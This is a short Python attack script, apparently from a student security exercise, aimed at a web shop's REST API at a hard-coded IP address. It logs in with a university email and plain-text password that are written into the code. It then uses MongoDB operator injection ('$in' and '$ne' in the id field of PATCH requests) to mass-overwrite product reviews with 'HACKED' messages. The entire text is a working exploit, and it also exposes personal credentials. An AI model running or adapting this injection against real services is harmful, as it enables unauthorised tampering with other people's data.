import json

import requests

s = requests.Session()

r = s.post(
    'http://43.241.202.47:3003/rest/user/login',
    data=json.dumps({
        "email": 'a1644290@student.adelaide.edu.au',
        "password": 'qwerty',
    }),
    headers={'Content-type': 'application/json;charset=utf-8'},
)

print("Login:", r)

s.headers.update({'Authorization': "Bearer " + json.loads(r.text)['authentication']['token']})


r = s.get("http://43.241.202.47:3003/rest/product/12/reviews")

r_json = json.loads(r.text)

print(r_json)

ids=[]

for product in r_json['data']:
    ids.append(product['_id'])

print(ids)

# $ne https://docs.mongodb.com/manual/reference/operator/query/ne/
r = s.patch(
    'http://43.241.202.47:3003/rest/product/reviews',
    data=json.dumps({"id": { '$in': ids }, "message": "HACKED :)"}),
    headers={'Content-type': 'application/json;charset=utf-8'},
)
print("Update:", r, r.text)

# $ne https://docs.mongodb.com/manual/reference/operator/query/ne/
r = s.patch(
    'http://43.241.202.47:3003/rest/product/reviews',
    data=json.dumps({"id": { '$ne': -1 }, "message": "HACKED! :)"}),
    headers={'Content-type': 'application/json;charset=utf-8'},
)
print("Update:", r, r.text)